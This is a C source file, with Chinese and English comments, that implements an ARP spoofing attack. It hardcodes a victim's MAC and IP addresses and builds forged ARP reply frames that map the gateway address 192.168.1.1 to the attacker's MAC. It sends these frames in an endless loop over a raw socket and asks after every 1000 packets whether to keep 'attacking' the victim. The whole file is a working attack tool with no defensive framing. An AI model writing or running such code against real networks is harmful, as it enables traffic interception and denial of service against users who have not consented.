#include "head.h"

char *INTERFACE; //存储网卡设备
u_char TARGET_MAC[6] = {0x74,0x29,0xaf,0x0f,0x09,0xe1}; //victim's mac
u_char SOURCE_MAC[6] = {0x00,0xc2,0xc6,0xb9,0x4d,0x80}; //attacker's mac
u_char TARGET_IP[4] = {192,168,1,223}; //victim's ip
u_char SOURCE_IP[4] = {192,168,1,1}; //gateway's ip
char errbuf[PCAP_ERRBUF_SIZE] = {0}; //存储错误信息

void input_mac(u_char *mac) {
    int i;
    for (i = 0; i < 6; i++) scanf("%hhx", &mac[i]);
}

void input_ip(u_char *ip) {
    int i;
    for (i = 0; i < 4; i++) scanf("%hhd", &ip[i]);
}

int main(int argc, char const *argv[]) {
    //第一步，初始化攻击资源
    INTERFACE = pcap_lookupdev(errbuf); //返回寻找到的第一个网络设备的指针
    if (INTERFACE == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }
    printf("Device: %s\n", INTERFACE);
    /*printf("Your victim's MAC: ");
    input_mac(TARGET_MAC);
    printf("Your victim's IP: ");
    input_ip(TARGET_IP);
    printf("Your MAC: ");
    input_mac(SOURCE_MAC);*/
    //创建套接字
    int soc;
    u_char frame[42]; //以太网头部和ARP头部总长
    printf("Creating socket\n");
    loading();
    soc = socket(AF_PACKET, SOCK_RAW, htons(EPT_ARP));
    if (soc == -1) {
        printf("Socket creat failed!\n");
        exit(1);
    }
    printf("Socket created!\n");
    //构建伪造ARP帧
    printf("Creating ARP packet\n");
    loading();
    ethernet_header ehead;
    arp_header arphead;
    memcpy(ehead.DST_mac, TARGET_MAC, 6);
    memcpy(ehead.SRC_mac, SOURCE_MAC, 6);
    ehead.eth_type = htons(EPT_ARP);
    arphead.hardware_type = htons(ARPHRD_ETHER);
    arphead.protocol_type = htons(EPT_IPv4);
    arphead.hardware_len = 6;
    arphead.protocol_len = 4;
    arphead.arp_option = htons(ARPOP_REPLY);
    memcpy(arphead.src_mac, SOURCE_MAC, 6);
    memcpy(arphead.src_ip, SOURCE_IP, 4);
    memcpy(arphead.dest_mac, TARGET_MAC, 6);
    memcpy(arphead.dest_ip, TARGET_IP, 4);
    memcpy(frame, &ehead, sizeof(ehead));
    memcpy(frame + sizeof(ehead), &arphead, sizeof(arphead));
    printf("ARP packet created!\n");
    //准备原始数据包
    printf("Preparing\n");
    loading();
    struct sockaddr_ll destaddr;
    destaddr.sll_family = AF_PACKET;
    if((destaddr.sll_ifindex = if_nametoindex(INTERFACE)) == 0) {
        perror("if_nametoindex() failed\n");
        exit(1);
    }
    destaddr.sll_halen = htons(6);
    printf("Struct sockaddr_ll destaddr ready.\n");
    //发送数据包
    printf("Attacking!\n");
    loading();
    int i = 0;
    char choose;
    while(1) {
        if(sendto(soc, frame, sizeof(frame), 0, (struct sockaddr *)&destaddr, sizeof(destaddr)) == -1) {
        perror("sendto() failed\n");
        exit(EXIT_FAILURE);
    }
    printf("Packet %d sent.\n", ++i);
        if (i % 1000 == 0) {
            printf("Do you want to send another 1000 packets to your victim? Y/N\n");
            /*getchar();*/
            scanf("%c", &choose);
            if (choose != 'Y' && choose != 'y') break;
        }
    }
    close(soc);
    printf("Socket closed.\n");
    return 0;
}